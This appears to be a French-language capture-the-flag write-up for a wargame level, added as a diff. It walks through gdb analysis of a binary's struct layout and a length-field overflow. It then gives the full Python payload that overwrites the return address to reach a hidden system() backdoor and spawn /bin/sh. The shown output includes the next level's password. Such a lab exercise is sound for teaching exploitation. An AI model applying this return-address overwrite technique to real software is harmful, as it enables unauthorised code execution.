@@ -1,0 +1,123 @@
+Dans gdb, on a une erreur lors des breakpoints, l'addresse ne semble pas correspondre, l'addresse exacte est donnée seulement après le lancement.
+seule la fin des addresse des disas est bonne.
+on fait donc 
+(gdb) b main
+Breakpoint 1 at 0xaac
+(gdb) run 
+Breakpoint 1, 0x0000555555554aac in main ()
+
+On sait donc maintenant que nos adresses commenceront par 0x0000555555554 suivie des 3 derniers chiffre donné par le disas.
+
+Quand on analye le programme avec gdb, on voit rapidement ce qu'on est sensé faire:
+en effet avec 
+(gdb) info functions
+on voit une fonction appelé secret_backdoor, qui n'est appelée par aucune autre fonction, et qui contient un appel system prenant en parametre ce qu'on aura mis dans un fgets précédent:
+system(my_input)
+
+On comprend assez vite qu'il va falloir faire un overflow quelque part pour réussir à appeler cette fameuse function secrete.
+
+On cherche donc les moyens de faire un overflow, malheureusement le seul strcpy est protégé par une taille, c'est un strncpy.
+Mais on voit que la taille qui lui ai donné en limite à ce strncpy est stockée en mémoire:
+   0x00000000000009a9 <+119>:	mov    0xb4(%rax),%eax
+Il y a peut être donc un moyen de modifier ce nombre.
+
+En effet, en observant un peu plus dans gdb, on comprend qu'on a une structure de données.
+Cette structure de données va être rempli au fur et à mesure du programme.
+On comprend dans handle msg que les données de la structure se suivent dans la mémoire :
+   0x00000000000008cb <+11>:	lea    -0xc0(%rbp),%rax
+        -> prend l'addresse rbp-0xc0 (rbp-192) = début de la structure, là ou sera stocké ls msg
+   0x00000000000008d2 <+18>:	add    $0x8c,%rax
+        -> ajoute 140 a rax. (140 octet du msg) on est maintenant a rbp-0x34 (rbp-52), c'est le début de username
+   ...
+   0x00000000000008ff <+63>:	movl   $0x8c,-0xc(%rbp)
+       -> place 140 à l'addresse rbp-0xc (rbp-12) c'est à dire 40 octets après rbp-0x34, ce nombre se trouve juste après de username
+       
+En résumé, dans handle_msg :
+On a une structure qui commence a rbp-0xc0,
+ensuite 140 octet sans rien (pour le msg),
+on arrive à rbp-0x34, et on a 40 octets mis à 0 (pour name),
+et enfin on arrive a rbp-Oxc où est stocké l'int 140
+
+
+______________________________
+|      140                   |
+|____________________________|
+|     username               |
+|    40 octets               |
+|____________________________|
+|     msg                    |
+|   140 octets               |
+|____________________________|
+
+Le nombre qui est donnée à notre strncpy correspond au nombre stocké dans notre structure juste après le stockage de username. 
+Si on déborde de username sur l'int pour mettre un nombre plus grand que 140, le strncpy sera limité par ce ouveau nombre plus grand, et peut être qu'on arrivera à faire un segfault.
+
+Il y a une protection qui copie notre username[i] tant que i <= 40.
+Il y a 40 place dans notre buffer avant d'arriver sur notre nombre.
+Sauf que i
+
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
+
+Breakpoint 2, 0x00005555555549c6 in set_msg ()      
+  -> (breakpoint au niveau de strncpy)
+(gdb) x/wx $rdx
+0x41:	Cannot access memory at address 0x41
+
+Bingo, en mettant 41 "A", l'addresse ou était sensé etre stocké le nombre max 140 contient maintenant 0x41,
+ce qui correspond à 65 en decimal.
+On pourra donc copier maintenant, le nombre peut donc bien être remplacé par un overflow.
+On va mettre le nombre le plus grand possible : 0xff, c'est a dire 255
+
+Ensuite on va chercher une addresse return a override dans les 255 octets qui suivent le msg.
+
+$ python -c 'print "A" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"' > /tmp/255
+(gdb) run < /tmp/255 
+Starting program: /home/users/level09/level09 < /tmp/255
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffe5c8:
+ rip = 0x555555554931 in handle_msg; saved rip 0x4138674137674136
+ called by frame at 0x7fffffffe5d8
+ Arglist at 0x6741356741346741, args: 
+ Locals at 0x6741356741346741, Previous frame's sp is 0x7fffffffe5d0
+ Saved registers:
+  rip at 0x7fffffffe5c8
+
+0x4138674137674136  -> 6Ag7Ag8A -> 200e position
+
+L'addresse retour de handle_msg est overflow à partir de la 200e position
+
+Donc si on place l'addresse de secret_backdoor à la 200e position du msg, 
+l'addresse de retour de handle_msg pointera désormais vers notre fonction secrete !
+Il suffit ensuite de faire passer l'argument /bin/sh dans un dernier input pour que la fonction secret_backdoor executre notre appelle system(/bin/sh)
+
+addresse de secret_backdoor : 0x000055555555488c
+
+$ python -c 'print 40 * "A" + "\xff" + "\n" + 200 * "A" + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n" + "/bin/sh" + "\n"' > /tmp/exploit
+$ cat /tmp/exploit - | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+
+
